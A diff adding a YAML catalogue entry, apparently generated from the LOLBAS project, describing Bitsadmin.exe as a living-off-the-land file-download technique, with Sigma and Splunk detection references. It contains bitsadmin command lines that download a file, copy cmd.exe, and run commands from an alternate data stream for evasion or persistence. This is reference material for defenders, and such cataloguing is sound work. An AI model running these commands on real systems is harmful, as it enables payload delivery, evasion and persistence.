@@ -1,0 +1,123 @@
+id: lolbas/T1NCaW5hcmllcy9CaXRzYWRtaW4ueW1s/RG93bmxvYWQ/1
+type: binary
+platform: windows
+name: Bitsadmin.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Child process from bitsadmin.exe
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/web/proxy_generic/proxy_ua_bitsadmin_susp_tld.yml
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml
+  - https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml
+commands:
+- template: bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe
+    bitsadmin /RESUME 1 bitsadmin /complete 1
+  comment: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target
+    command, then resume and complete the job.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Bitsadmin.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Bitsadmin.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Bitsadmin.exe\nDescription: Used for managing background intelligent\
+        \ transfer\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: bitsadmin /create\
+        \ 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin\
+        \ /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete\
+        \ 1\n    Description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job\
+        \ to run the target command from an Alternate data stream, then resume and complete the job.\n\
+        \    Usecase: Performs execution of specified file in the alternate data stream, can be used as\
+        \ a defensive evasion or persistence technique.\n    Category: ADS\n    Privileges: User\n   \
+        \ MitreID: T1564.004\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows\
+        \ 10, Windows 11\n  - Command: bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe\
+        \ c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1\n    Description:\
+        \ Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target\
+        \ command, then resume and complete the job.\n    Usecase: Download file from Internet\n    Category:\
+        \ Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows vista, Windows\
+        \ 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n  - Command: bitsadmin /create 1 & bitsadmin\
+        \ /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME\
+        \ 1 & bitsadmin /Complete 1 & bitsadmin /reset\n    Description: Command for copying cmd.exe to\
+        \ another folder\n    Usecase: Copy file\n    Category: Copy\n    Privileges: User\n    MitreID:\
+        \ T1105\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n \
+        \ - Command: bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\\
+        playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin\
+        \ /RESUME 1 & bitsadmin /Reset\n    Description: One-liner that creates a bitsadmin job named\
+        \ 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete\
+        \ the job.\n    Usecase: Execute binary file specified. Can be used as a defensive evasion.\n\
+        \    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\
+        \ vista, Windows 7, Windows 8, Windows 8.1, Windows 10\nFull_Path:\n  - Path: C:\\Windows\\System32\\\
+        bitsadmin.exe\n  - Path: C:\\Windows\\SysWOW64\\bitsadmin.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/web/proxy_generic/proxy_ua_bitsadmin_susp_tld.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml\n\
+        \  - Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml\n\
+        \  - IOC: Child process from bitsadmin.exe\n  - IOC: bitsadmin creates new files\n  - IOC: bitsadmin\
+        \ adds data to alternate data stream\nResources:\n  - Link: https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679\n\
+        \  - Link: https://www.youtube.com/watch?v=_8xJaaQlpBo\n  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n\
+        \  - Link: https://www.soc-labs.top/en/detections/100\nAcknowledgement:\n  - Person: Rob Fuller\n\
+        \    Handle: '@mubix'\n  - Person: Chris Gates\n    Handle: '@carnal0wnage'\n  - Person: Oddvar\
+        \ Moe\n    Handle: '@oddvarmoe'\n"
+      document_sha256: sha256:1e282f4f1424fbc1a5cceb95ab057e643d95604a6f9cf14129cd1d117c5cc54d
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:0c87d18948d0e374013ef52eea49db002724df972e800b1a33a5a31365f1c109
